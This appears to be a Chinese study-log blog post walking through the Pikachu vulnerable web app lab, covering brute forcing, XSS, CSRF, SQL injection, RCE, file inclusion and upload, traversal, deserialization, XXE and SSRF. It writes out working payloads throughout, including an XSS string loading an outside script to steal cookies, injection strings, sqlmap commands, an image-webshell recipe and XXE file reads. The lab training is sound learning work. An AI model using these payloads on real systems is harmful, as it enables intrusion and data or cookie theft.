---
title: Pikachu靶场实操
date: 2024-02-04 09:57:16
tags:
  - 网络安全
  - 学习日志
---

# Pikachu靶场实操

## 暴力破解

### 概述

连续性尝试+字典+自动化

#### 字典

- 常用的账号密码
- 社工库
- 算法生成

#### 暴力破解漏洞

- 是否要求复杂密码
- 是否使用安全的验证码
- 是否进行次数限制
- 是否采用双元素认证

#### 验证码

- 防止登录暴力破解
- 防止机器恶意注册

#### 测试流程

- 确认登录接口的脆弱性
  - 比如:尝试登录--抓包--观察验证元素和response信息
- 对字典进行优化
  - 根据注册提示信息进行优化
  - 管理员
- 工具自动化操作

### Pikachu关卡

#### 基于表单的暴力破解

此关没有设置验证码等防范措施, 使用Brup Suite的Intruder功能, 如果response中没有`username or password is not exists`可以说明破解成功

步骤:

1. 尝试手动提交表单, 使用brupsuite拦截
   ![](https://i0.imgs.ovh/2024/02/03/bSOeR.png)
2. 发送到Intruder, 关闭拦截, 配置好payload和字典, 开始进行破解(Cluster bomb)
3. 对结果按照长度或有无`username or password is not exists`进行整理, 发现test/abc123和admin/123456可能是正确的, 验证后,可以确认破解成功
   ![](https://i0.imgs.ovh/2024/02/03/bSdpW.png)

#### 验证码绕过(on server)

验证码在后端会进行验证, 但是验证码可以被重复利用, 因此可以手动输入正确的验证码, 然后一直利用该验证码进行破解, 其余操作同上

![](https://i0.imgs.ovh/2024/02/03/bSD8e.png)

- *原因: php中 session默认的过期时间为1440秒, 后端没有对此进行设置, 因此这段时间内验证码可以一直用*

#### 验证码绕过(on client)

验证码只能在前端限制客户端发包, 非常容易解除, 没有很好的验证效果, 其余操作同上

#### token防爆破

由于token已经出现在前端代码中, 因此我们可以轻易获取, 我先猜测用户名为admin, 然后通过音叉模式结合字典和从响应中获取的token进行暴破

![](https://i0.imgs.ovh/2024/02/03/buV7s.png)

## XSS跨站脚本

### 概述

#### 测试流程

1. 在目标站点上找到输入点, 比如查询接口, 留言板等
2. 输入一组“特殊字符+唯一识别字符”，点击提交后,查看返回的源码，是否有做对应的处理
3. 通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);
4. 提交构造的脚本代码(以及各种绕过姿势)，看是否可以成功执行，如果成功执行则说明存在XSS漏洞;

#### tips

1. 一般查询接口容易出现反射型XSS，留言板容易出现存储型XSS
2. 由于后台可能存在过滤措施,构造的script可能会被过滤掉，而无法生效,或者环境限制了执行(浏览器);
3. 通过变化不同的script，尝试绕过后台过滤机制;

#### 反射型xss(GET与POST)

- GET型可以用伪装后的url, 更容易攻击

#### XSS绕过

- 转换
  - 大小写`<ScRipT>`
  - 拼凑`<scr<script>ipt>`
  - 注释`<sc<!--a-->ript>`
- 编码
  - url编码
  - html编码

#### htmlspecialchars()函数

htmlspecialchars()函数把预定义的字符转换为HTML实体。

> &(和号)成为&amp
> "(双引号)成为&quot
> '(单引号)成为&#039
> <(小于)成为&lt
> ‘>’(大于)成为&gt

### Pikachu关卡

#### 反射型xss(get)

```php
$html.="<p class='notice'>who is {$_GET['message']},i don't care!</p>";
```

源码没有对message进行任何检查和过滤

解除前端输入限制后输入`</p><script>alert();</script><p>`即可

![](https://i0.imgs.ovh/2024/02/03/bxp1J.png)

#### 反射型xss(post)

一次性,会与服务端交互,输入`</p><sCRiPt sRC=//uj.ci/pq7></sCrIpT><p>`成功打到cookie
![](https://i0.imgs.ovh/2024/02/03/bxwvW.png)

#### 存储型xss

同样没有检查和过滤, 每次刷新都会加载一遍, 输入同上
![](https://i0.imgs.ovh/2024/02/03/bxsBo.png)

#### DOM型xss

输入的内容会被填入超链接
输入`' onclick='alert()`然后点击超链接链接:
![](https://i0.imgs.ovh/2024/02/03/bxKv5.png)

#### DOM型xss-x

输入内容同上, 点击第二个出现的超链接运行, 类似于get反射型xss, 可以通过url攻击
![](https://i0.imgs.ovh/2024/02/03/bx1yp.png)

#### xss之盲打

我留言的内容在后台显示到管理员界面, 因此输入`</td><script>alert();</script><td>`, 管理员进入后台后就会被弹窗
![](https://i0.imgs.ovh/2024/02/03/bx5oK.png)

#### xss之过滤

`<script`会被过滤掉, 但是换成大写就不会, 比如`<ScriPt>alert();</SCripT>`
![https://i0.imgs.ovh/2024/02/03/bxYY2.png](https://i0.imgs.ovh/2024/02/03/bxYY2.png)

#### xss之htmlspecialchars

单引号`'`没有被处理, 因此可以输入`#' onclick=alert();'`
![](https://i0.imgs.ovh/2024/02/04/beYBl.png)

#### xss之herf输出

这关没有在后端限制只能输入url因此可以填入js代码`javascript:alert()`
![](https://i0.imgs.ovh/2024/02/04/bed1d.png)

#### xss之js输出

关于输入的源码如下:

```html
<script>
    $ms='432';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }

    }
</script>
```

可以在`$ms='432'`构造闭合, 输入`tmac'</script><script>alert();</script>`
![](https://i0.imgs.ovh/2024/02/04/beEf2.png)

## CSRF(跨站请求伪造)

### 概述

- 通过伪装来自受信任用户的请求来利用受信任的网站 

#### 与XSS的区别

- XSS可以拿到用户的权限(盗取cookie), 然后实施破坏
- CSRF借用户的权限进行攻击, 而没有拿到用户的权限

#### 确认是否存在CSRF漏洞

- 判断请求是否可以被伪造
- 确认凭证的有效期

#### Token如何防止CDRF

- 每次请求增加一个随机码, 后台每次对次进行验证

### Pikachu关卡

#### CSRF(get)

- 假设攻击者是Allen, 可以得到修改信息提交表单时的url为`http://192.168.1.9:7071/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=13676767767&add=nba+767&email=allen%40pikachu.com&submit=submit`

- 假设攻击目标是vince, 已知他目前的个人信息为:

  > 姓名:vince
  >
  > 性别:boy
  >
  > 手机:18626545453
  >
  > 住址:chain
  >
  > 邮箱:vince@pikachu.com

- 要把他的个人信息中的地址修改为`moon`, 那么可以伪造一个链接`http://192.168.1.9:7071/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=18626545453&add=moon&email=vince%40pikachu.com&submit=submit`

- 让vince点击这个链接, 就可以利用vince的权限, 向web发出请求, 修改个人信息
  ![](https://i0.imgs.ovh/2024/02/04/bgpJU.png)



#### CSRF(post)

- post请求中, 表单不在url中, 而在请求体中, 这时可以伪造一个站点, 让vince给伪造站点发出请求, 把请求中的参数进行修改, 向真正的站点提交post请求
- 在伪造站点(钓鱼网站)中, 我在表单添加一个action, 让表单提交到真正的网站上`<form actiom="http://192.168.1.9:7071/vul/csrf/csrfpost/csrf_post_edit.php" method="post">`
- 在vince点击提交时, 将vince的信息进行修改, 即可达成目的
  ![](https://i0.imgs.ovh/2024/02/04/bgpJU.png)

#### CSRF Token

## SQL注入

### 概述

- 攻击者可以通过合法输入点提交一些精心构造的语句, 从而欺骗后台数据库对其进行执行, 导致数据库信息泄露

- 例如:
  正常输入: `1`, 执行`select password from users where id=1`
  非法输入:`1 or 1=1`, 执行`select password from users where id=1 or 1=1;`
  后者会输出表中的所有password

#### 攻击流程

1. 注入点探测(自动/手动)

   - 判断注入点类型
   - 判断查询列数
   - 判断显示位置

2. 信息获取

   - 获取所有数据库名

     >一次性显示全部:group_concat(字段名)
     >
     >逐一显示: limit

   - 获取某数据库所有表名

   - 获取某库某表中所有字段名

   - 获取字段的数据

3. 获取权限

#### 注入点类型

- 数字型
- 字符型: `'xxx'`
- 搜索型: `%xxx%`

*根据类型进行构造闭合*

#### 基于union联合查询的信息获取

- 查询列数必须相同

#### 判断查询列数

- order by: 按照指定字段名进行排序

#### 基于报错信息获取 

- 使用一些指定的函数来制造报错, 从报错信息中获取特定的信息
- 背景条件: 后台没有屏蔽报错信息, 在语法发生错误时会输出在前端

##### 报错函数

- `updatexml()`

  ```sql
  updatexml(xml_document, XPathstring, new_value)
  #第一个参数: 表中的字段名(字符串)
  #第二个参数:Xpath格式的字符串
  #String格式，替换查找到的符合条件的
  ```

  **"XPath定位必须是有效的, 否则会发送错误"**可以利用这一点制造报错信

  例如`updatexml(1,concat(0x7e,database(),0))`会产生报错信息, 其中有`database()`执行的结果

- `extractvalue()`

  ```sql
  extractvalue(xml_document, xpath_string)
  #同样通过xpath产生报错
  ```

- `floor()`
  取整函数, 示例:
  
  ```sql
  xxx' and (select 2 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
  ```

#### 盲注

- 后台屏蔽了报错信息, 无法根据报错进行注入的判断  
- 分类
  - 基于真假, 例:`vince' and ascii(substr(database(),1,1))=112#`
  - 基于时间, 例:`vince' and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#`
- 通过`ascii(substr((xx语句), n, n))=x`判断

#### 宽字节注入



### Pikachu关卡

#### 数字型注入(post)

- 表单内容在前端进行了限制, 但是很容易解除, 比如可以抓包然后进行修改, 下图将原本提交的`1`修改为`1 or 1=1`
  ![](https://i0.imgs.ovh/2024/02/04/btJxp.png)

- 提交后, 可以看到所有的用户都被查询成功
  ![](https://i0.imgs.ovh/2024/02/04/btziT.png)

#### 字符型注入(get)

- 构造闭合即可, 先对站点进行测试, 可先传入一些特殊字符比- 如`'`, `"`, `%`等, 下面是输入单引号`'`的结果,
  ![](https://i0.imgs.ovh/2024/02/04/btjkl.png)

- 测试发现其后端对查询语句的处理是用单引号`'`进行包裹的,因此可以用单引号构造闭合, 例如, 输入`' or 1=1;#`, 同样可以搜索到所有用户,  其中, `#`对将后面的内容注释掉防止报错

#### 搜索型注入

- 测试发现可以用`%'`构造闭合, 且输入`#%' or 1=1 order by 3;#`显示正常,, 但是输入`#%' or 1=1 order by 4;#`显示异常, 说明总共有三列

- 输入`#%' and id=1 union select user(),database(),version();#`获取到一些数据库信息

  ![](https://i0.imgs.ovh/2024/02/05/bJMIW.png)

#### xx型注入

- 输入`'`:
  ![](https://i0.imgs.ovh/2024/02/05/bJsI5.png)

- 通过报错信息的提示可以推断, 应按照`('xx')`构造闭合
  ![](https://i0.imgs.ovh/2024/02/05/bJwye.png)

#### "insert/update"注入

- **insert*
  - 正常没有回显, 但是可以通过报错获取信息
  
  - payload:`xxx' or updatexml(1,concat(0x7e,user()),0) or '`获取到user信息:
    ![](https://i0.imgs.ovh/2024/02/05/biomv.png)
  
- **update**
  - payload和insert相同

#### "delete注入"

- 分析: 根据抓包得到的信息可以发现, 执行删除操作时会向服务器发送一个get请求, 请求中含有要删除内容的数字id,推测在后端有语句`delete from xxx where id=78`
  ![](https://i0.imgs.ovh/2024/02/06/b8o6o.png)

- 因此可以在此次插入sql语句`or updatexml(1,concat(0x7e,xxx),0) `制造报错, 从而获取信息
  ![](https://i0.imgs.ovh/2024/02/06/b8u95.png)
  ![](https://i0.imgs.ovh/2024/02/06/b8OMs.png)

#### "http header"注入

- 根据登录后的页面可以得知, 后端对请求头的数据进行了处理, 可以尝试在请求头中插入sql语句

- 将UA头修改为`Firefox' or updatexml(1, concat(0x7e, database()) ,0) or '#`
  ![](https://i0.imgs.ovh/2024/02/06/b85uu.png)

  得到
  ![](https://i0.imgs.ovh/2024/02/06/b8Y8l.png)

####  盲注(base on boolean)

- 后端可能对报错进行了过滤, 导致没有回显, 但是输入`vince' and 1=1#`显示
  ![](https://i0.imgs.ovh/2024/02/07/bqWkO.png)
- 输入`vince' and 1=2#`
  ![](https://i0.imgs.ovh/2024/02/07/bqktH.png)
- 根据这点不同可以获取到信息,比如payload为`vince' and ascii(substr(database(),1,1))=112#`时显示第一种情况, 说明database名的第一个字符为`p`, 根据这个原理可以不断的尝试直到获取到所有信息
- 但是手动操作非常的麻烦, 可以使用自动化工具sqlmap进行操作
  获取当前数据库名:`py .\sqlmap.py -u "http://192.168.5.133:7090/vul/sqli/sqli_blind_b.php?name=1234&submit=%E6%9F%A5%E8%AF%A2" --current-db`
- ![](https://i0.imgs.ovh/2024/02/07/bq0ND.png)
- 获取到数据库名为`pikachu`
- 以此类推可以获取到更多信息
  ![](https://i0.imgs.ovh/2024/02/07/bqhOA.png)

####  盲注(base on time)

- 没有回显, 甚至输入什么都一样, 无法通过前面的基于真假进行判断有无sql注入漏洞
- 但是输入`vince`加载只花了80毫秒左右, 而输入`vince' and sleep(5)#`却确实花了5秒左右
  ![](https://i0.imgs.ovh/2024/02/07/bqsD5.png)
- 说明sleep(5)确实作为一个sql语句被执行了, 这里存在sql注入漏洞, 结合基于真假的盲注的原理, 可以构造payload:`vince' and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#`
- 同样也是5秒后才加载完成, 说明数据库名的第一个字符为`p`, 也可以使用sqlmap进行自动化操作
  ![](https://i0.imgs.ovh/2024/02/07/bqbKX.png)

#### 宽字节注入

- 后端对输入的内容进行了转义, `'`转义为`\'`使原本的payload`vince' or 1=1 ;#`无法使用
- 由于mysql使用gbk编码, 单引号转义后编码为`%5c%27`, 如果在单引号前面输入%df使其变成`%df%5c%27`前面的`%df%5c`就会被解析为一个汉字, 单引号`%27`就成功逃逸了, 实现了闭合
- payload修改为`vince%df' or 1=1;#`
  ![](https://i0.imgs.ovh/2024/02/07/b9LTA.png)

## 越权漏洞

### 概述

- 由于没有对用户权限进行严格的判断, 导致低权限账号可以去完成高权限账号的操作

- 属于逻辑漏洞, 是由于权限校验的逻辑不够严谨

- 水平越权
  - 同等权限级别间

- 垂直越权
  - 不同权限级别间

### Pikachu关卡

#### 水平越权

- 登录lucy账号, 然后点击"查看个人信息"的时候会发送一个get请求:`http://192.168.1.9:7071/vul/overpermission/op1/op1_mem.php?username=lucy&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF`

- 服务器后台可能没有对用户权限做严格的判断, 可能导致一个用户能够查看另一个用户的信息
- 在登录lucy账号之后, 将上面get请求中的lucy改为其他用户名(比如lili), 发现可以访问
  ![](https://i0.imgs.ovh/2024/02/07/b9W5u.png)

#### 垂直越权

- 这关里pikachu是普通管理员, admin是超级管理员, 其中只有超级管理员能够执行增加用户的操作

- 先抓取超级管理员执行增加用户的数据包, 然后退出登录, 改为登录普通管理员的账号, 将获取到的数据包的请求头中的cookie替换为pikachu的cookie, 在请求体中填入增加用户的信息

  ![](https://i0.imgs.ovh/2024/02/07/b9KRI.png)

## RCE-命令执行漏洞

### 概述

- 可以让攻击者总直接注入命令或恶意代码, 控制服务器后台

#### 远程系统命令执行

- **原理**: 系统上存在给用户提供特点的远程命令操作的接口(如ping), 但是没有严格的安全控制措施

- 例如: 

  ```php
  <?php
      if (isset($_POST['host'])) {
          $host = $_POST['host'];
          $res = shell_exec("ping -c 4 {$host}");
          echo $res;
      }
  ?>
  ```

- 此时如果输入`127.0.0.1; ipconfig`就会把后面的命令也执行

### Pikachu关卡

#### ping-远程系统命令执行

- 可使用`|`, `||`, `&`等进行拼接, 估计没做过滤处理
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20170114.png?raw=true)

#### eval-远程代码执行

- 根据提示, 后台大概是使用了`eval()`函数

- 尝试输入`phpinfo();`, 查看是否可以执行代码
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20170509.png?raw=true)

- 证明可以执行任意代码, 通过hackbar得知key为`txt`, 使用蚁剑尝试连接

  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20171007.png?raw=true)

- 拿下webshell

## 文件包含漏洞

### 概述

- `include()，require()，include_once()，require_once()`会解析执行php文件
- 在`allow_url_include`, `allow_url_fopen`为`on`时还可以通过url地址对远程的文件进行包含, 一般会配合伪协议

### Pikachu关卡

#### 本地文件包含

- 通过观察url, 有一个参数为fileX.php, X为1~5
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20172345.png?raw=true)
- 尝试用别的文件, 比如file6.php
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20172548.png?raw=)

- 可以看到解析了file6.php的内容, 获取了一些信息

#### 远程文件包含

- 除了本地文件包含, 还可以通过http协议或php伪协议进行包含, 例如通过`php://filter/read`进行源码的获取
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20173642.png?raw=)

- 解码后可获取源码
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20173853.png?raw=)

## 不安全的文件下载

### 概述

- 在下载功能中, 如果攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。

### Pikachu关卡

- 下载链接如下:
  `http://192.168.5.143:7090/vul/unsafedownload/execdownload.php?filename=kb.png`

- 尝试将文件`kb.png`改为其它路径的文件,比如当前页面的文件`../down_nba.php`, 发现可以下载
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20174553.png?raw=)

- 以此类推, 几乎所有文件都可以下载, 比如C盘中的系统配置文件system.ini
  `http://192.168.5.143:7090/vul/unsafedownload/execdownload.php?filename=../../../../../../Windows/system.ini`

## 文件上传漏洞

### 概述

- [通用漏洞-文件上传| Myprefer's Blog](https://myprefer.github.io/post/WEB攻防-通用漏洞#文件上传)

### Pikachu关卡

#### 客户端check

- 只在客户端检查, 修改js或抓包改包即可绕过
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20175850.png?raw=)

#### 服务端check

- 抓包, 将其中的文件类型改为image/jpeg即可

#### getimagesize()

- getimagesize()函数会获取图片信息, 需要伪造图片马才能绕过

- 用命令`copy tmp.png/b+eval.php 1.jpg`生成图片马

  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20180938.png?raw=)

- 可以看到一句话木马拼接到了jpg文件中
- 上传后, 由于木马文件为jpg后缀, 无法直接执行, 但可以结合文件包含漏洞使用:
  `http://192.168.1.5/pikachu/vul/fileinclude/fi_local.phpfilename=file:///C:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\1.jpg`

## 目录遍历

### 概述

- 在 Web 功能设计中，很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活， 当用户发起一个前端的请求时，便会将请求的这个文件的值（比如文件名称）传递到后台，后台再执行其对应的文件

- 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过`../`这样的手段让后台打开或者执行一些其他的文件，从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞

### Pikachu关卡

- **title**参数可通过`../`进入任意目录, 造成信息泄露, 比如读取system.ini文件信息
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20182400.png?raw=)

## 敏感信息泄露

### 概述

- 由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到
  - 通过访问url下的目录，可以直接列出目录下的**文件列表**
  - **报错信息**里面包含操作系统、中间件、开发语言的版本或其他信息;
  - **前端源码**里面包含了敏感信息

### Pikachu关卡

- 前端代码中泄露了敏感信息
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20182757.png?raw=)

## PHP反序列化

### 概述

- [WEB攻防-反序列化 | Myprefer's Blog](https://myprefer.github.io/post/WEB攻防-反序列化)

### Pikachu关卡

- 此漏洞利用需要代码审计,  漏洞代码:
  ```php
  class S{
      var $test = "pikachu";
      function __construct(){
          echo $this->test;
      }
  }
  
  $html='';
  if(isset($_POST['o'])){
      $s = $_POST['o'];
      if(!@$unser = unserialize($s)){
          $html.="<p>大兄弟,来点劲爆点儿的!</p>";
      }else{
          $html.="<p>{$unser->test}</p>";
      }
  
  }
  ```

- 据此生成payload的代码
  ```php
  <?php
  class S{
      var $test = "123333";
  }
  $a = new S();
  echo serialize($a);
  ?>
  ```

  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20184225.png?raw=)

- 发现可以用来构造xss, 比如`O:1:"S":1:{s:4:"test";s:25:"<script>alert(1)</script>";}`
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20184518.png?raw=)

## XXE-xml外部实体注入漏洞

### 概述

- XXE：XML External Entity attack（XML外部实体攻击）。其实XXE就是攻击者自定义了XML文件进行了执行

#### XML&DTD

- XML(Extensible Markup Language)，全称为可扩展标记语言，是一种传输的数据格式
- DTD(Document Type Definition),全称为文档类型定义，是XML文档中的一部分，用来定义元素, **对xml文档定义语义约束**。

#### XML结构

```xml
<!--第一部分: XML声明-->
<?xml version="1.0"?>

<!--第二部分: 文档类型定义DTD-->
<!DOCTYPE note [ 
<!ENTITY entity-name SYSTEM "URL/URL" >
]>

<!--第三部分: 文档元素-->
<note>
<to>123</to>
<from>abc</from>
<head>xyz</head>
<body>hhhh</body>
</note>
```

#### 外部实体引用payload

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [ 
<!ENTITY SYSTEM "file:///flag" >
]>
<x>&f;</x>
```

### Pikachu关卡

- payload:

  ```
  <?xml version = "1.0"?>
  <!DOCTYPE ANY [
      <!ENTITY f SYSTEM "file:///Windows/system.ini">
  ]>
  <x>&f;</x>
  ```

- 可以读取任意文件
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20195858.png?raw=)

## 不安全的url跳转

### 概述

- 如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话, 就可能发生"跳错对象"的问题。
- 危害: 钓鱼

### Pikachu关卡

- 点击第三句话时会进行一个跳转, 正确的跳转应该是转到概述页面, 发现网页通过参数`url`确定跳转目标
  `http://192.168.5.146:7090/vul/urlredirect/urlredirect.php?url=unsafere.php`
- 这里参数url可以改成任意url, 比如`url=https://google.com`, 可跳转到对应网页, 可用于钓鱼攻击

## SSRF-服务端请求伪造

### 概述

- 服务端提供了**从其他服务器应用**获取数据的功能且没有对目标地址做过滤与限制

- 数据流: 攻击者-->服务器-->目标地址

#### 产生SSRF漏洞的函数

- **file_get_contents**

    从指定url读取文件:

    ```php
    $content = file_get_contents($_POST['url']); 
    ```

- **fsockopen**

    ```
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
    ```

- **curl_exec**

    ```php
    $link = $_POST['url'];
    $curlobj = curl_init();
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
    $result=curl_exec($curlobj);
    ```

***还可以使用伪协议***

### Pikachu关卡

- 使用了`curl_exec()`函数发送请求, 可以用来探测内网信息, 比如探测3306端口:`http://192.168.5.146:7090/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306`

  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20203750.png?raw=)

- 利用file协议读取任意服务器文件:`http://192.168.5.146:7090/vul/ssrf/ssrf_c`
  `url.php?url=file:///C:/Windows/system.ini`

  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20204301.png?raw=)

- 利用dict协议扫描内网主机开放端口:
  ![](https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20204540.png?raw=)

